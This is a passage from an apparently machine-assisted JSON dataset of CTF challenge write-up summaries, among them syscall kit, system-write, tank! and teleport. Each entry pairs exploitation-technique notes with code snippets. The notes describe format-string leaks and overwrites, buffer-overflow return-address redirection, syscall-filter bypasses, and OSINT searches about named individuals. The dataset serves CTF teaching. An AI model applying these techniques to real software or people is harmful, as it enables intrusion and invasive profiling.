0 and next_position <= 0 and not full_pixel(pixel):  # <<<<<<<<<<<<<<  \n           new_matrix[nx_len - j, i] = embed(pixel_bit(int(binary_string[0])), pixel)  \n           next_position = randint(1, 17)  \n           binary_string = binary_string[1:]  \n           remaining_bits -= 1  \n       else:  \n           new_matrix[nx_len - j, i] = pixel  \n           next_position -= 1  # <<<<<<<<<<<<<<\n\nnew_image.save(\"./symatrix.png\")  \nnew_image.close()  \nbase_image.close()\n\nprint(\"Work done!\")  \nexit(1)  # <<<<<<<<<<<<<<  \n```"
    },
    {
        "name": "syscall kit",
        "write_up": "dataset/raw/syscall kit.md",
        "type": "pwn",
        "competition": [
            "zer0pts/2020",
            "https://ctftime.org/event/1006/tasks/"
        ],
        "score": 671,
        "max_score": 755,
        "difficulty": 0.8887417218543047,
        "knowledge": [
            "When a binary with Position Independent Executable (PIE) protection prohibits direct address leaks and places restrictions on syscall usage, the `brk` syscall can be utilized to extend the heap and effectively serve as a consistent reference point. This approach enables the construction of a reliable exploit by manipulating the heap to leak addresses or modify memory, even without initially knowing the binary's base address. Example steps to achieve this include using `brk(0x10000)` to allocate heap space and then leveraging that space as a scratchpad for further operations.",
            "In environments where direct syscall execution is restricted or monitored, it's possible to bypass syscall filters by utilizing alternative syscalls that are not blacklisted and can indirectly achieve the desired effect. For instance, the `arch_prctl` syscall can be repurposed to write values to arbitrary addresses by manipulating the GS register, and syscalls like `writev` and `readv` can be used for arbitrary read/write primitives. This technique involves carefully planning a chain of benign-looking syscalls to manipulate memory and execute arbitrary code, demonstrating a method to circumvent syscall filtering mechanisms. An example sequence includes setting the GS register to a controlled value using `arch_prctl(ARCH_SET_GS, value)` and then using `writev` or `readv` with crafted structures to read or write memory."
        ],
        "key": "```c\nstruct iovec {  \n\tvoid  *iov_base;  \n\tsize_t iov_len;  \n} s = {  \n\t.iov_base = heap,  \n\t.iov_len  = 0x2000,  \n};\n```\n\n```php\nfunction write64(Tube $t, $addr, $value)  \n{  \n\tsyscall($t, 158, 0x1001, $value);  \n\tret($t);\n\n\tsyscall($t, 158, 0x1004, $addr);  \n\tret($t);  \n}\n```"
    },
    {
        "name": "system-leak",
        "write_up": "dataset/raw/system-leak.md",
        "type": "pwn",
        "competition": [
            "Defcamp/2023/Quals",
            "https://ctftime.org/event/2106/tasks/"
        ],
        "score": 247,
        "max_score": 347,
        "difficulty": 0.7118155619596542,
        "knowledge": [
            "For binary exploitation challenges involving format strings vulnerabilities, leveraging the arbitrary read capability allows for an effective information leak. This is particularly useful when the binary displays its memory content based on the input format string. In situations where the binary's protections (Full RELRO, Stack Canary, NX, PIE) are in place, focusing on arbitrary read through format string vulnerabilities can yield critical information, such as environment variables or potential pointers for further exploitation. \n\n   - Sample payload for leaking stack information:\n     ```python\n     payload = \"%{}$s\".format(offset).encode()\n     ```",
            "When dealing with protected binaries that allow for user input to be directly used in functions like `printf`, experimenting with different offsets is key to bypass protections and access sensitive information. This often involves sending crafted payloads that include format specifiers (e.g., `%s`) in a loop with varying offsets until the desired information is leaked. This approach is helpful when direct exploitation methods are hindered by security protections.\n\n   - Example Python script snippet for iterating over offsets:\n     ```python\n     for i in range(start_offset, end_offset):\n         payload = \"%{}$s\".format(i).encode()\n         target.sendline(payload)\n         # Further commands to interact with the target\n     ```"
        ],
        "key": "```c\n\tprintf(\"Enter the message to write to syslog: \");  \n\tfgets(local_218,0x200,stdin);  \n\tfgets(local_218,0x200,stdin);  \n\tsyslog((int)local_222,local_218);  \n\tcloselog();  \n```"
    },
    {
        "name": "system-write",
        "write_up": "dataset/raw/system-write.md",
        "type": "reverse",
        "competition": [
            "Defcamp/2023/Quals",
            "https://ctftime.org/event/2106/tasks/"
        ],
        "score": 287,
        "max_score": 347,
        "difficulty": 0.8270893371757925,
        "knowledge": [
            "When exploiting a format string vulnerability to leak addresses or write data to arbitrary addresses, it's essential to identify useful pieces of data such as the addresses of functions within the Global Offset Table (GOT) and offsets to critical libc functions (e.g., `system`). This can be performed by crafting payloads that manipulate format string vulnerabilities to read or overwrite memory contents. Specifically, in scenarios where you have control over a format string input to a function like `syslog`, you can leverage this to craft payloads that leak memory addresses or overwrite function pointers to gain control of the execution flow.   \nExample payload for leaking addresses: `%x %x %x %x %x...` to read memory contents.  \nExample payload for overwriting: use the format string `%[value]c%[index]$hn` to write specific bytes to an address.",
            "In exploiting buffer overflow vulnerabilities, especially when PIE (Position Independent Executable) is disabled, and the binary has a buffer overflow vulnerability, it's possible to overwrite local variables, return addresses, or GOT entries to redirect program execution. This technique can be used in tandem with leaking addresses to calculate the base address of libc and ultimately perform an arbitrary code execution, such as executing a `system` call with a desired command. Buffer overflows can be particularly powerful when combined with other vulnerabilities (like format string vulnerabilities) to write arbitrary data into memory and control the flow of execution to achieve code execution within the constraints of the challenge.\nExample payload to exploit buffer overflow and execute arbitrary command: `A * buffer_size + \"/bin/cat flag.txt\"`."
        ],
        "key": "```c  \n\tprintf(\"Enter the log level (LOG_INFO, LOG_WARNING, LOG_ERR, etc.): \");  \n\t__isoc99_scanf(\" %[^\\n]\",local_222);  \n\n\tprintf(\"Enter the message to write to syslog: \");  \n\tfgets(local_218,0x200,stdin);  \n\tfgets(local_218,0x200,stdin);  \n\tsyslog((int)local_222,local_218);  \n\tcloselog();  \n```"
    },
    {
        "name": "Take an L",
        "write_up": "dataset/raw/Take an L.md",
        "type": "misc",
        "competition": [
            "CSAW/2018/Quals",
            "https://ctftime.org/event/633/tasks/"
        ],
        "score": 200,
        "max_score": 1285,
        "difficulty": 0.1556420233463035,
        "knowledge": [
            "For challenges involving algorithmic grid filling with constraints, a recursive division strategy can be employed. This approach breaks down the problem into smaller, more manageable subproblems. Specifically, for a grid of size `2^n x 2^n` with a single cell that must remain unfilled, the grid can be divided into four quarters. Each quarter is then solved independently, adjusting the strategy based on the location of the unfilled cell. This method is especially effective when the problem size is a power of two, as it ensures that the division process is evenly balanced.",
            "When designing a filling algorithm for a grid with constraints (like leaving one cell unfilled), consider using a pattern or shape that can be repeated or rotated to cover the entire area without violating the constraint. In the case of tiling a grid with L-shaped tiles while avoiding a specific spot, the solution involves placing a single tile in a strategic position to connect all four quarters of the grid after they have been independently tiled, taking into account the unfilled cell. This approach not only ensures coverage of the grid but also simplifies the tiling process by reducing it to a smaller instance of the problem."
        ],
        "key": "```haxe\nclass TakeL {\n    static function main() {\n        var n = 6;\n        var size = 1 << n;\n        var board = new Array<Array<Int>>();\n        for (i in 0...size) {\n            board.push(new Array<Int>());\n            for (j in 0...size) {\n                board[i].push(0);\n            }\n        }\n        // Assume hole is at (0, 0)\n        board[0][0] = -1;\n        tile(board, 0, 0, size, 0, 0);\n        printBoard(board);\n    }\n\n    static function tile(board:Array<Array<Int>>, x:Int, y:Int, size:Int, holeX:Int, holeY:Int) {\n        if (size == 2) {\n            var tileNum = 1;\n            for (i in 0...2) {\n                for (j in 0...2) {\n                    if (board[x + i][y + j] == 0) {\n                        board[x + i][y + j] = tileNum;\n                    }\n                }\n            }\n            return;\n        }\n        var half = size / 2;\n        var centerX = x + half;\n        var centerY = y + half;\n        var tileNum = 1;\n        if (holeX < centerX && holeY < centerY) {\n            tile(board, x, y, half, holeX, holeY);\n        } else {\n            board[centerX - 1][centerY - 1] = tileNum;\n            tile(board, x, y, half, centerX - 1, centerY - 1);\n        }\n        if (holeX < centerX && holeY >= centerY) {\n            tile(board, x, centerY, half, holeX, holeY);\n        } else {\n            board[centerX - 1][centerY] = tileNum;\n            tile(board, x, centerY, half, centerX - 1, centerY);\n        }\n        if (holeX >= centerX && holeY < centerY) {\n            tile(board, centerX, y, half, holeX, holeY);\n        } else {\n            board[centerX][centerY - 1] = tileNum;\n            tile(board, centerX, y, half, centerX, centerY - 1);\n        }\n        if (holeX >= centerX && holeY >= centerY) {\n            tile(board, centerX, centerY, half, holeX, holeY);\n        } else {\n            board[centerX][centerY] = tileNum;\n            tile(board, centerX, centerY, half, centerX, centerY);\n        }\n    }\n\n    static function printBoard(board:Array<Array<Int>>) {\n        for (row in board) {\n            for (cell in row) {\n                if (cell == -1) {\n                    Sys.print(\"O \");\n                } else {\n                    Sys.print(cell + \" \");\n                }\n            }\n            Sys.println(\"\");\n        }\n    }\n}\n```"
    },
    {
        "name": "Taking Off",
        "write_up": "dataset/raw/Taking Off.md",
        "type": "The type of this challenge is **reverse**.",
        "competition": [
            "angstrom/2020",
            "https://ctftime.org/event/982/tasks/"
        ],
        "score": 70,
        "max_score": 300,
        "difficulty": 0.23333333333333334,
        "knowledge": [
            "In reverse engineering challenges requiring bypassing argument checks, symbolic execution tools like angr can be utilized to automatically solve for acceptable input values. This technique is particularly useful when direct calculation or guesswork is impractical due to the program's complexity or the requirement to meet specific conditions (such as `100 * arg2 + 10 * arg1 + arg3 == 932` in the challenge). By representing arguments as symbolic variables and setting up the program's entry state with these variables, angr can explore various execution paths to find values that lead to the desired program state while avoiding undesired states.",
            "When dealing with string manipulation and condition checks in C++ reverse engineering tasks, encoding or simple bitwise operations (e.g., XOR with a constant) can often be the method used to check for correct input or to disguise data. If the solution to bypass or fulfill these checks isn't immediately apparent through static analysis, dynamic analysis tools or scripts can help identify the correct input by methodically iterating over possible values or by reversing the operation. In the given challenge, the password check involves XORing each character of the input string with `0x2A` and comparing it against a desired value. This kind of operation is reversible, meaning knowing the operation and the target allows for the original input calculation.\n\nSample payload for automatically solving with symbolic execution (using angr as demonstrated in the solution):\n```python\n# Setting up the symbolic variables for arguments\narg1 = claripy.BVS('arg1', 8)\narg2 = claripy.BVS('arg2', 8)\narg3 = claripy.BVS('arg3', 8)\n# Defining the actual arguments to pass, including the symbolic variables\nargv = [proj.filename, arg1, arg2, arg3, 'chicken']\n```\n\nAnd for reversing XOR operation (conceptual, related to the password check):\n```python\n# Assuming 'desired' holds the encoded byte values and 'decoded_password' is where we'll store our decoded characters.\ndecoded_password = \"\".join(chr(byte ^ 0x2A) for byte in desired)\nprint(decoded_password)  # This would print the decoded password if 'desired' array contained the XORed password bytes.\n```"
        ],
        "key": "```c++\nvoid __fastcall main(int argc, const char **argv, const char **envp)  \n{  \n int v3;  \n int v4;  \n int v5;  \n int i;  \n int v7;  \n char *v8;  \n char s[136];  \n unsigned __int64 v10;\n\n v10 = __readfsqword(0x28u);  \n puts(\"So you figured out how to provide input and command line arguments.\");  \n puts(\"But can you figure out what input to provide?\");  \n if ( argc == 5 )  \n {  \n   string_to_int(argv[1], (__int64)&v3;;  \n   string_to_int(argv[2], (__int64)&v4;;  \n   string_to_int(argv[3], (__int64)&v5;;  \n   if ( is_invalid(v3)  \n     || is_invalid(v4)  \n     || is_invalid(v5)  \n     || 100 * v4 + 10 * v3 + v5 != 932  \n     || strcmp(argv[4], \"chicken\") )  \n   {  \n     puts(\"Don't try to guess the arguments, it won't work.\");  \n   }  \n   else  \n   {  \n     puts(\"Well, you found the arguments, but what's the password?\");  \n     fgets(s, 128, stdin);  \n     v8 = strchr(s, 10);  \n     if ( v8 )  \n       *v8 = 0;  \n     v7 = strlen(s);  \n     for ( i = 0; i <= v7; ++i )  \n     {  \n       if ( ((unsigned __int8)s[i] ^ 0x2A) != desired[i] )  \n       {  \n         puts(\"I'm sure it's just a typo. Try again.\");  \n         return;  \n       }  \n     }  \n     puts(\"Good job! You're ready to move on to bigger and badder rev!\");  \n     print_flag();  \n   }  \n }  \n else  \n {  \n   puts(\"Make sure you have the correct amount of command line arguments!\");  \n }  \n}  \n```"
    },
    {
        "name": "tank! bonus",
        "write_up": "dataset/raw/tank! bonus.md",
        "type": "This write-up is for a \"pwn\" (short for \"pawn\") challenge. This type of challenge typically involves exploiting vulnerabilities in a program to gain unauthorized access or control of the system, often through techniques like buffer overflows, format string attacks, or return-oriented programming (ROP). In this case, the write-up describes identifying a vulnerability in a game called \"tank!\", planning an attack to exploit this vulnerability, and ultimately gaining control over the program's execution flow to achieve the desired outcome. The challenge also extends to \"tank! bonus,\" where the exploit evolves to include using libc ROP techniques to achieve the same goal in a slightly different context.",
        "competition": [
            "Square/2023",
            "https://ctftime.org/event/2111/tasks/"
        ],
        "score": 150,
        "max_score": 500,
        "difficulty": 0.3,
        "knowledge": [
            "In challenges involving buffer overflow vulnerabilities where the overflow can affect neighboring variables or data on the stack, it's essential to analyze the layout of the stack to identify key variables that can be altered to benefit the exploit. This includes manipulating constants or bounds checks that are placed adjacent to buffers. By carefully crafting input to overflow a buffer, adjacent variables such as max limits (e.g., max power, max angle) can be changed to remove constraints and further exploit the program.  \n   **Example payload approach**: To exploit the max power and angle variables, ensure the payload alters the specific bytes adjacent to the buffer, such as sending a projectile that overflows the buffer and changes the least significant byte (LSB) of the max power and the most significant byte (MSB) of the max angle to a desired value, like 0x2d for \"-\" symbol.",
            "In scenarios where direct manipulation of target memory addresses or execution flow is restricted, leveraging user inputs or game mechanics to \"place\" required bytes onto the stack or certain memory locations can be a viable strategy. This can involve using aspects of the program that read user input and store it in a way that it becomes part of the execution flow or manipulates the program's state indirectly. Specifically, in cases where control over a return address or similar pointer is needed but directly writing to it is not possible, inputs that end up in the right memory location relative to the controlled overflow can be used to influence program behavior or control flow indirectly.  \n   **Example payload approach**: If an application allows a short, controlled input that is stored on the stack and the overflow vulnerability allows for altering nearby stack values (such as a return address), use a portion of the input field to insert the required byte(s). For instance, in a shooting command \u201cpew!\\n\u201d, appending desired control bytes after this sequence allows placing specific values on the stack. To change a return address to the win function (0x4013de), append the bytes \"\\xde\" at a strategic point in the user input or buffer overflow process, assuming the address space layout randomization (ASLR) can be bypassed or isn't a factor."
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\n#define BOARD_SIZE 112\n\nint main() {\n    char game_board[BOARD_SIZE];\n    int max_angle = 90;\n    int max_power = 100;\n    char user_input[8];\n\n    // Simulate user input for shooting\n    fgets(user_input, sizeof(user_input), stdin);\n\n    // Check if user input is \"pew!\\n\"\n    if (strcmp(user_input, \"pew!\\n\") == 0) {\n        // Simulate special ammo shot\n        int landing_index = 111; // Assume this is calculated\n        game_board[landing_index] = '-';\n        game_board[landing_index - 1] = '-'; // Left overflow\n        game_board[landing_index + 1] = '-'; // Right overflow\n    }\n\n    return 0;\n}\n```"
    },
    {
        "name": "tank!",
        "write_up": "dataset/raw/tank!.md",
        "type": "This write-up details the exploitation of a binary challenge named \"tank!\" and its bonus version, providing in-depth analysis on identifying the vulnerability, planning the attack, creating a payload, and exploiting the vulnerabilities. \n\nBased on the content, the type of challenge described in the write-up is **pwn** (short for \"exploiting binaries by gaining unauthorized access to a server\").",
        "competition": [
            "Square/2023",
            "https://ctftime.org/event/2111/tasks/"
        ],
        "score": 350,
        "max_score": 500,
        "difficulty": 0.7,
        "knowledge": [
            "In scenarios involving buffer overflow vulnerabilities where an application allows for certain controlled overflows, a practical approach is to exploit adjacent variables in memory to extend the overflow's impact. When a program uses adjacent memory locations for variables closely tied to the program's control flow (e.g., max values for input), manipulating these can allow an attacker to significantly alter the program's behavior beyond the intended limits. This technique enables broader exploitation opportunities, such as altering program logic or injecting arbitrary values into the program's execution path. \n\n    - For instance, if a game restricts input angles and power for a projectile within certain limits, but special game mechanics allow for buffer overflow by one byte on either side of a game board array, this overflow can be used to overwrite adjacent `max power` and `max angle` variables. By carefully planning shots that lead to buffer overflow, one can modify these `max power` and `max angle` variables to accept larger values than intended, enabling further overflow possibilities and control over the program.\n    - Example payload to change `max power` and `max angle`: Shoot a projectile with special ammo that lands exactly at the edge of the game board array, causing buffer overflow and modifying the least significant byte of `max power` and the most significant byte of `max angle` with the ammo symbol's ASCII value.",
            "In challenges where injecting or modifying specific values on the stack is required to control program flow (e.g., to call a win function or modify a return address), consider leveraging user inputs that are partially constrained but allow for a controlled byte to be written to memory. Specifically, when a program reads user inputs into an array and uses portions of this input for program logic, the unconstrained section of the input can be manipulated for strategic memory modification.\n\n    - This can be achieved through an application that compares user input with a fixed string but allows for one or more characters in the input buffer to be user-defined and subsequently writes this input to a stack location that is interesting from an exploitation perspective. \n    - Example payload to place specific bytes on the stack: If the program expects the input \"pew!\\n\" and reads the input into a buffer of size 8, leaving the last byte free for user control, an attacker could input \"pew!\\n\\x00\\x13\" (where \\x13 is the byte of interest), utilizing the program's logic to place the byte \\x13 into a strategic memory location (e.g., overwriting the lower two bytes of a function's return address to redirect execution flow)."
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\n#define BOARD_SIZE 112\n\nint main() {\n    char game_board[BOARD_SIZE];\n    int max_angle = 360;\n    int max_power = 100;\n    char user_input[8];\n\n    // Simulate user input for shooting\n    fgets(user_input, sizeof(user_input), stdin);\n\n    // Check if user input is \"pew!\\n\"\n    if (strcmp(user_input, \"pew!\\n\") == 0) {\n        // Simulate special ammo shot\n        int landing_index = 111; // Assume this is calculated\n        game_board[landing_index] = '-';\n        game_board[landing_index - 1] = '-'; // Left overflow\n        game_board[landing_index + 1] = '-'; // Right overflow\n    }\n\n    return 0;\n}\n```"
    },
    {
        "name": "taxes",
        "write_up": "dataset/raw/taxes.md",
        "type": "The type of the CTF challenge described in the write-up is **crypto**.",
        "competition": [
            "DiceCTF/2022",
            "https://ctftime.org/event/1541/tasks/"
        ],
        "score": 272,
        "max_score": 500,
        "difficulty": 0.544,
        "knowledge": [
            "To extract text from PDF files programmatically, particularly in scenarios where PDFs contain structured information critical for advancing in cybersecurity challenges, the `pdftotext` tool from the Poppler suite can be very effective. Specifically, the `-raw` option often yields the best results by maintaining the original layout of the text in the PDF while making it accessible for further text-based processing or parsing. This approach can be especially useful when dealing with PDFs that contain forms or structured data that must be analyzed or converted into a different format for automation or data extraction purposes.",
            "When faced with a challenge that involves understanding or interacting with a virtual machine (VM) described in a structured document or set by exploiting simple arithmetic or bitwise operations, a strategic approach is to simulate the VM's behavior through a custom script or program. This involves analyzing the documented VM instructions to identify operations (e.g., push, pop, add, subtract, multiply, xor) and control structures (e.g., conditional jumps or loops), then implementing these operations in a high-level programming language to emulate the VM's execution. This method can uncover hidden data, decode messages, or solve puzzles embedded within the VM's logic, particularly useful in CTF challenges or scenarios requiring reverse engineering of obfuscated algorithms."
        ],
        "key": "```javascript  \nv3 = input[0]  \nv5 = v3 ^ 68  \nv7 = v5 & 255  \nv9 = (v7 == 45)  \nv11 = v9 ? 1 : 0  \nv12 = 0 + v11  \nv13 = input[1]  \nv15 = v13 ^ 105  \nv16 = v15 & 255  \nv18 = (v16 == 7)  \nv19 = v18 ? 1 : 0  \nv20 = v12 + v19  \n// ...  \nv117 = input[15]  \nv118 = v117 ^ 103  \nv119 = v118 & 255  \nv121 = (v119 == 2)  \nv122 = v121 ? 1 : 0  \nv123 = v116 + v122  \nv125 = (v123 == 16)  \nv126 = (1 if v125 else 0)  \nv127 = v126  \n```\n\n```python  \ndef foo(v1, v2):  \n  while True:  \n    # ...  \n    v1925 = v1924  \n    v1925 = v2  \n    if v1926 == 0:  \n      return v1925\n\n    v1929 = v1926 - 1  \n    v1, v2 = v1295, v1929  \n```\n\n```python  \ndef foo(v1, v2):  \n  # Part II Step 1  \n  v3 = v1  \n  v5 = v3 &  3  \n  v6 = (v5 ==  3)  \n  v8 = (v5 ==  2)  \n  v10 = (v5 ==  1)  \n  v11 = v2  \n  v13 = v11 <<  7  \n  v15 = (v5 ==  0)  \n  v16 = v3 >>  2  \n  v17 = ( 0 if v15 else v16)  \n  v19 = v17 &  127  \n  v20 = v13 + v19  \n  v21 = (v20 if v10 else v11)  \n  v22 = v21 &  127  \n  v23 = (v22 ==  0)  \n  v24 = v17 >>  7  \n  v25 = (v24 if v10 else v17)  \n  v26 = (v25 if v23 else  0)  \n  v27 = (v26 if v8 else v25)  \n  v28 = v27 >>  2  \n  v29 = (v28 if v6 else v27)\n\n  # Part II Step 2  \n  v30 = v1  \n  v32 = v30 &  3  \n  v33 = (v32 ==  3)  \n  v35 = (v32 ==  2)  \n  v37 = (v32 ==  1)  \n  v38 = v2  \n  v40 = v38 <<  7  \n  v42 = (v32 ==  0)  \n  v43 = v30 >>  2  \n  v44 = ( 0 if v42 else v43)  \n  v46 = v44 &  127  \n  v47 = v40 + v46  \n  v48 = (v47 if v37 else v38)  \n  v49 = v48 &  127  \n  v50 = (v49 ==  0)  \n  v51 = v44 >>  7  \n  v52 = (v51 if v37 else v44)  \n  v53 = (v52 if v50 else  0)  \n  v54 = (v53 if v35 else v52)  \n  v55 = v54 &  3  \n  v56 = (v55 ==  0)  \n  v57 = (v48 if v50 else  0)  \n  v58 = (v57 if v35 else v48)  \n  v60 = v58 >>  14  \n  v61 = v60 <<  7  \n  v62 = v58 &  127  \n  v63 = v58 >>  7  \n  v64 = v63 &  127  \n  v65 = v62 + v64  \n  v66 = v65 &  127  \n  v67 = v61 + v66  \n  v68 = (v55 ==  1)  \n  v69 = v64 - v62  \n  v70 = v69 &  127  \n  v71 = v61 + v70  \n  v72 = (v55 ==  2)  \n  v73 = v62 * v64  \n  v74 = v73 &  127  \n  v75 = v61 + v74  \n  v76 = v62 ^ v64  \n  v77 = v76 &  127  \n  v78 = v61 + v77  \n  v79 = (v75 if v72 else v78)  \n  v80 = (v71 if v68 else v79)  \n  v81 = (v67 if v56 else v80)  \n  v82 = (v81 if v33 else v58)\n\n  # Part III  \n  v83 = v29  \n  v84 = v82  \n  v86 = v84 & 127\n\n  if v83 == 0:  \n    return v86\n\n  return foo(v83, v84)  \n```"
    },
    {
        "name": "TCC2",
        "write_up": "dataset/raw/TCC2.md",
        "type": "misc",
        "competition": [
            "UMDCTF/2023",
            "https://ctftime.org/event/1949/tasks/"
        ],
        "score": 451,
        "max_score": 500,
        "difficulty": 0.902,
        "knowledge": [
            "When encountering challenges that require finding specific pieces of information about individuals such as their workplace or interests, social engineering research techniques can be effective. Use quoted searches on search engines with known data (e.g., email addresses) to find personal documents or profiles that could contain the needed information. For instance, a quoted search can lead to finding a CV or LinkedIn profile that reveals an individual's employer. Condition: This approach is applicable when you have some piece of personal information (like an email address) about the individual.",
            "In challenges that involve guessing details related to personal preferences or actions, leveraging community platforms (e.g., Discord servers, social media) where the targets are active can yield hints or direct answers. Look for specific threads or comments related to the query. This can also extend to utilizing public registries (like Amazon's Wedding Registry) to find items associated with a person when you have contextual clues (names, event types). Condition: This method is most useful when the challenge pertains to personal decisions or preferences and you have access to the online communities or platforms the individuals might use."
        ],
        "key": "```python\ndef check_answers(answers):\n    correct_answers = {\n        \"question1\": \"1st place\",\n        \"question2\": \"Leidos\",\n        \"question3\": \"Misc\",\n        \"question4\": \"Shazo\"\n    }\n    \n    for question, answer in answers.items():\n        if correct_answers.get(question) != answer:\n            return False\n    return True\n\nuser_answers = {\n    \"question1\": input(\"What was the TCC team's position in their latest CTF? \"),\n    \"question2\": input(\"Which company does p1ku work for? \"),\n    \"question3\": input(\"What is Bree's favorite CTF category? \"),\n    \"question4\": input(\"What brand is the gift Blub is going to buy? \")\n}\n\nif check_answers(user_answers):\n    print(\"Access granted to the secret page!\")\nelse:\n    print(\"Access denied. Please try again.\")\n```\n"
    },
    {
        "name": "TechSupport",
        "write_up": "dataset/raw/TechSupport.md",
        "type": "This write-up describes a reverse engineering challenge where the participants are required to patch a binary in a way that is not detected. The challenge involves bypassing integrity checks performed via GDB to protect the binary from patching, and making the original binary crash through input manipulation.\n\nTherefore, based on the provided information, the type of this challenge is **reverse**.",
        "competition": [
            "DEFCON/2018/Quals",
            "https://ctftime.org/event/608/tasks/"
        ],
        "score": 177,
        "max_score": 500,
        "difficulty": 0.354,
        "knowledge": [
            "In scenarios involving remote debugging sessions where the challenge server performs integrity checks on a binary to protect against patching, one approach to alter the binary's behavior without triggering integrity checks is to introduce an instruction that crashes the program in a controlled manner. This can be specifically useful when needing to cause a program state that can be externally observed to verify the effect of the modification without being directly caught by checksum-based or similar integrity verifications. Example payload approach involves patching a breakpoint (e.g., `int 3`) into the binary at a strategic location that only gets executed under certain conditions controlled by the attacker.",
            "When dealing with binary challenges that involve calculations and inputs can influence the path or the state of the binary, leveraging overflow vulnerabilities or carefully crafted inputs to manipulate program behavior can be an effective strategy. Specifically, forcing a division by zero through crafted inputs, based on the program's logic to calculate values (like the total weight computed from a chemical formula), allows an attacker to control program flow or state. This technique can be extended to scenarios where manipulating the program's calculation or logic flow can lead to revealing security-sensitive information or altering the program's intended behavior. In the context of the challenge, this involved complex input crafting through linear programming to create a scenario where the division by zero occurs, possibly leveraging specialized libraries like PuLP for Python to generate the inputs that satisfy the specific conditions needed to trigger the vulnerability."
        ],
        "key": "```c\nint calculate_total_weight(char *formula) {\n    int total_weight = 0;\n    while (*formula) {\n        int atom_weight = get_atom_weight(*formula);\n        int count = get_atom_count(formula);\n        total_weight += atom_weight * count;\n        formula += get_next_atom_position(formula);\n    }\n    return total_weight;\n}\n\nvoid print_stats(int total_weight) {\n    if (total_weight > 1000) {\n        int recalculated_weight = recalculate_weight();\n        int stats = 100 / recalculated_weight; // Potential division by zero\n        printf(\"Stats: %d\\n\", stats);\n    }\n}\n```"
    },
    {
        "name": "Tedious",
        "write_up": "dataset/raw/Tedious.md",
        "type": "reverse",
        "competition": [
            "UIUCTF/2021",
            "https://ctftime.org/event/1372/tasks/"
        ],
        "score": 50,
        "max_score": 500,
        "difficulty": 0.1,
        "knowledge": [
            "When facing a reverse engineering challenge that involves a binary performing mathematical transformations on input to check for a correct flag, a productive strategy can involve statically analyzing the decompiled code to understand the transformations (like XORing and addition/subtraction) applied to the input. After understanding these transformations, if direct reverse-engineering of the logic proves too complex or tedious, shift the approach towards dynamic analysis. This could involve modifying the binary to output intermediate states or results, such as the transformed values of input characters. This approach reduces the need for manual calculation and can provide a clearer path to reverse-engineering the input transformation logic.\n   - Example dynamic analysis modification: Insert `printf(\"%d\\n\", input[i]);` statements after the transformations to output the intermediate values of each character.",
            "In reverse engineering tasks, especially when decompiled code involves complex mathematical transformations on inputs (like character codes), automating the reverse of these transformations can significantly ease the process of finding the correct input or flag. This can be achieved by writing a script that maps out the post-transformation values to their corresponding pre-transformation inputs. Once the mapping is established, use this information to reverse-engineer the flag by matching the expected output values (obtained from analyzing the binary\u2019s comparison logic) with the corresponding characters from your mapping. This method is especially useful when direct analytical reversal of the transformation logic is impractical.\n   - Example script part for creating the mapping: \n     ```python\n     array = {'a': 81, 'b': 106, ... , '}': 117}\n     expected_output = [77, 57, 77, ... , 117]\n     flag = \"\"\n     for num in expected_output:\n         for char, value in array.items():\n             if value == num:\n                 flag += char\n                 break\n     print(flag)\n     ```"
        ],
        "key": "```c\nundefined8 main(void) {  \n // initializations  \n long lVar1;  \n long local_10;  \n local_10 = *(long *)(in_FS_OFFSET + 40);  \n //etc... removed for readability\n\n // asks for the flag and puts it into input  \n puts(\"Enter the flag:\");  \n fgets((char *)input,40,stdin);\n\n // it does a bunch of math to add and subtract integers from the character\ncode of each letter inputted  \n for (int i = 0; i < 39; i++) {  \n   input[i] += 0x3b ^ 0x38;//3  \n }  \n for (int i = 0; i < 39; i++) {  \n   input[i] += 0x12 ^ 0xfd;//239  \n }  \n // etc... other loops removed for readability\n\n // clears everything?  \n puVar2 = &local_d8;  \n for (int j = 20; j != 0; j--) {  \n   *puVar2 = 0;  \n   puVar2++;// = puVar2 + 1;//(bVar3 * -2) + 1;  \n }\n\n // initializes array of values to compare it to  \n local_d8._0_4_ = 0x4d;  \n local_d8._4_4_ = 0xb9;  \n local_d0 = 0x4d;  \n local_cc = 0xb;  \n local_c8 = 0xd4;  \n // etc... other initializations removed for readability\n\n // tells you if you got it right or wrong  \n for (int i = 0; i <= 38; i++) {  \n   if (i==38) {  \n     printf(\"GOOD JOB!\");  \n   }  \n   else if (input[i] != local_d8 + (i*4)) {  \n     printf(\"WRONG!! \");  \n     break;  \n   }  \n }  \n return 0;  \n}  \n```"
    },
    {
        "name": "teleport",
        "write_up": "dataset/raw/teleport.md",
        "type": "misc",
        "competition": [
            "GoogleCTF/2020",
            "https://ctftime.org/event/1041/tasks/"
        ],
        "score": 474,
        "max_score": 474,
        "difficulty": 1.0,
        "knowledge": [
            "When dealing with challenges that require manipulating the position or state of an entity within constraints, consider using special numerical values like `NaN` (Not a Number) that behave uniquely under those constraints. This approach is particularly useful in languages that handle such values in non-intuitive ways, enabling bypass of checks or limitations. For example, in Python, `float('nan')` comparisons with numbers always return `False`, which can be leveraged to bypass distance checks.\n\n    Example payload: Enter `nan, nan` to move to an undefined position and then `10000000000000, 10000000000000` to reach the target coordinates without triggering the movement distance restriction.",
            "In scenarios where the program logic is based on user input and there are checks on the inputs' outcomes (like distance calculations), consider edge cases or exceptional inputs that the language's standard library functions might incorrectly handle or parse differently than expected. This is applicable in a vast array of programming challenges, especially those involving numeric computations or input validation.\n\n    No specific example payload provided, as this point is more about a general approach than a specific input."
        ],
        "key": "```python  \nimport math\n\nx = 0.0  \nz = 0.0  \nflag_x = 10000000000000.0  \nflag_z = 10000000000000.0  \nprint(\"Your player is at 0,0\")  \nprint(\"The flag is at 10000000000000, 10000000000000\")  \nprint(\"Enter your next position in the form x,y\")  \nprint(\"You can move a maximum of 10 metres at a time\")  \nfor _ in range(100):  \n   print(f\"Current position: {x}, {z}\")  \n   try:  \n       move = input(\"Enter next position(maximum distance of 10): \").split(\",\")  \n       new_x = float(move[0])  \n       new_z = float(move[1])  \n   except Exception:  \n       continue  \n   diff_x = new_x - x  \n   diff_z = new_z - z  \n   dist = math.sqrt(diff_x ** 2 + diff_z ** 2)  \n   if dist > 10:  \n       print(\"You moved too far\")  \n   else:  \n       x = new_x  \n       z = new_z  \n   if x == 10000000000000 and z == 10000000000000:  \n       print(\"ractf{#####################}\")  \n       break  \n```"
    },
    {
        "name": "Tenet",
        "write_up": "dataset/raw/Tenet.md",
        "type": "reverse",
        "competition": [
            "HITCON/2020",
            "https://ctftime.org/event/1136/tasks/"
        ],
        "score": 222,
